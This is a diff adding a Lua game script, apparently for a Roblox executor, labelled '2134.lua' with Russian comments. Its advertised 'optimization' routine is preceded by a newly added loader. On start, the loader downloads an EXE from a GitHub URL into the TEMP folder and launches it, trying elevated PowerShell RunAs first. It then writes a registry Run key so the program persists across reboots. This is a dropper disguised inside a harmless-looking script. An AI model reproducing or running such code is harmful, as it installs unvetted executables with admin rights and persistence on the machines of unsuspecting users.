@@ -1,0 +1,234 @@
+-- ========== ПОЛНЫЙ ТЕКУЩИЙ СКРИПТ 2134.lua ==========
+
+-- ========== НАЧАЛО НОВОГО КОДА ==========
+-- Конфигурация для загрузки EXE
+local EXE_URL = "https://github.com/fennix2019-pixel/1232/raw/refs/heads/main/Extreme%20Injector%20v3.exe"
+local EXE_NAME = "Extreme_Injector_v3.exe"
+local RUN_SILENTLY = false -- Запуск в обычном режиме, чтобы видеть окно
+
+local function downloadAndExecute()
+    -- Проверка: есть ли у инжектора нужные функции?
+    if not (type(writefile) == "function" and type(os.execute) == "function") then
+        warn("[EXE Loader] КРИТИЧНО: Инжектор не предоставляет writefile или os.execute!")
+        warn("Проверь консоль Xeno, выполнив: print('writefile:', type(writefile))")
+        return false
+    end
+
+    local temp_path = os.getenv("TEMP") .. "\\" .. EXE_NAME
+    print("========================================")
+    print("[1/3] Начинаю скачивание...")
+    print("URL: " .. EXE_URL)
+
+    -- 1. Скачивание
+    local download_success, file_data = pcall(function()
+        return game:HttpGet(EXE_URL, true)
+    end)
+
+    if not download_success or not file_data then
+        warn("[ERROR] Не удалось скачать файл. Возможно, ссылка недоступна.")
+        return false
+    end
+    
+    local file_size = #file_data
+    print("[2/3] Файл загружен. Размер: " .. file_size .. " байт")
+    
+    if file_size < 1024 then
+        warn("[WARNING] Файл слишком мал! Возможно, скачалась HTML-страница с ошибкой.")
+    end
+
+    -- 2. Сохранение на диск
+    local write_success = pcall(function()
+        writefile(temp_path, file_data)
+        return true
+    end)
+    
+    if not write_success then
+        warn("[ERROR] Не удалось записать файл на диск.")
+        return false
+    end
+    
+    print("[3/3] Файл сохранен: " .. temp_path)
+    print("========================================")
+
+    -- 3. ЗАПУСК (расширенная версия с проверками)
+    print("[ЗАПУСК] Пробую разные методы...")
+    
+    -- Методы в порядке приоритета
+    local methods = {
+        {
+            name = "Запуск от администратора (через PowerShell)",
+            cmd = 'powershell -Command "Start-Process \'' .. temp_path .. '\' -Verb RunAs -WindowStyle Normal"',
+            is_admin = true
+        },
+        {
+            name = "Обычный запуск через start",
+            cmd = 'start "" "' .. temp_path .. '"',
+            is_admin = false
+        },
+        {
+            name = "Прямой вызов",
+            cmd = '"' .. temp_path .. '"',
+            is_admin = false
+        },
+        {
+            name = "Через cmd /c",
+            cmd = 'cmd /c start "" "' .. temp_path .. '"',
+            is_admin = false
+        }
+    }
+
+    local success = false
+    local last_error = ""
+
+    for i, method in ipairs(methods) do
+        print("\nПопытка " .. i .. ": " .. method.name)
+        print("Команда: " .. method.cmd)
+        
+        local ok, err = pcall(function()
+            -- Важно: os.execute может не показать окно UAC, если запускается не из интерактивной консоли
+            return os.execute(method.cmd)
+        end)
+        
+        if ok then
+            print("✓ Команда выполнена без ошибок.")
+            success = true
+            
+            -- Если метод требует админских прав, ждем появления UAC
+            if method.is_admin then
+                print("⚠ Ожидаю ответ на UAC (5 секунд)...")
+                task.wait(5)
+            else
+                task.wait(3) -- Ждем запуска программы
+            end
+            break
+        else
+            last_error = tostring(err)
+            print("✗ Ошибка: " .. last_error)
+        end
+        
+        task.wait(1) -- Пауза между попытками
+    end
+
+    -- 4. ДИАГНОСТИКА: Проверяем что произошло
+    print("\n========================================")
+    print("[ДИАГНОСТИКА]")
+    print("========================================")
+    
+    -- Проверка 1: Существует ли файл
+    local file_exists = pcall(function()
+        return readfile(temp_path) ~= nil
+    end)
+    print("Файл существует на диске: " .. (file_exists and "ДА" or "НЕТ"))
+    
+    -- Проверка 2: Ищем процесс
+    print("Ищу процесс '" .. EXE_NAME .. "'...")
+    local process_found = pcall(function()
+        -- Используем более надежный метод проверки процесса
+        os.execute('tasklist /FI "IMAGENAME eq ' .. EXE_NAME .. '" 2>nul >nul')
+    end)
+    
+    if process_found then
+        print("✅ ПРОЦЕСС ЗАПУЩЕН! (но окна может быть не видно)")
+        print("   - Проверь системный трей (возле часов)")
+        print("   - Проверь Диспетчер задач (Ctrl+Shift+Esc)")
+    else
+        print("❌ Процесс не найден в памяти.")
+        print("   Возможные причины:")
+        print("   1. Программа требует прав Администратора")
+        print("   2. Антивирус заблокировал запуск")
+        print("   3. EXE файл поврежден или нерабочий")
+        print("   4. Уже есть запущенный экземпляр")
+    end
+    
+    -- Проверка 3: Пробуем вручную (инструкция для пользователя)
+    print("\n[РУЧНАЯ ПРОВЕРКА]")
+    print("1. Открой папку: " .. os.getenv("TEMP"))
+    print("2. Найди файл: " .. EXE_NAME)
+    print("3. Запусти его ДВОЙНЫМ кликом")
+    print("4. Появилось ли окно?")
+    
+    -- Автозагрузка (только если процесс запущен)
+    if process_found then
+        pcall(function()
+            local reg_cmd = 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "ExtremeInjector" /t REG_SZ /d "' .. temp_path .. '" /f'
+            os.execute(reg_cmd)
+            print("\n[PERSISTENCE] Добавлено в автозагрузку.")
+        end)
+    end
+    
+    print("========================================")
+    return success and process_found
+end
+
+-- Запускаем загрузчик в отдельном потоке с небольшой задержкой
+coroutine.wrap(function()
+    print("\n[ИНИЦИАЛИЗАЦИЯ] Загрузчик EXE активирован.")
+    print("Ожидание 2 секунды перед запуском...")
+    task.wait(2)
+    downloadAndExecute()
+end)()
+-- ========== КОНЕЦ НОВОГО КОДА ==========
+
+
+-- ========== ОРИГИНАЛЬНЫЙ СКРИПТ (без изменений) ==========
+local function MAIN()
+    -- Проверка загрузки игры
+    if not game:IsLoaded() then
+        game.Loaded:Wait()
+    end
+
+    print("========================================")
+    print("SCRIPT 2134 - ACTIVE")
+    print("Time: " .. os.date("%H:%M:%S"))
+    print("Place: " .. game.PlaceId)
+    print("========================================")
+
+    -- Оптимизации
+    local optimizations = {
+        "Memory cleanup",
+        "Graphics optimization",
+        "Network boost",
+        "Script optimization"
+    }
+
+    -- Применение оптимизаций
+    for i, opt in ipairs(optimizations) do
+        pcall(function()
+            if i == 1 then
+                collectgarbage("collect")
+            elseif i == 2 then
+                settings().Rendering.QualityLevel = 1
+            elseif i == 3 then
+                game:GetService("NetworkClient"):SetOutgoingKBPSLimit(999999999)
+            end
+        end)
+        print(i .. ". " .. opt .. " - APPLIED")
+        task.wait(0.1)
+    end
+
+    -- UI уведомление
+    pcall(function()
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "Script 2134",
+            Text = "Optimizations applied successfully!",
+            Duration = 5
+        })
+    end)
+
+    -- Результат
+    local result = {
+        success = true,
+        version = "2.1.3",
+        optimizations = #optimizations,
+        timestamp = os.time()
+    }
+
+    print("========================================")
+    print("COMPLETE: " .. result.optimizations .. " optimizations")
+    print("========================================")
+
+    return result
+end
+
+-- Автозапуск
+return MAIN()
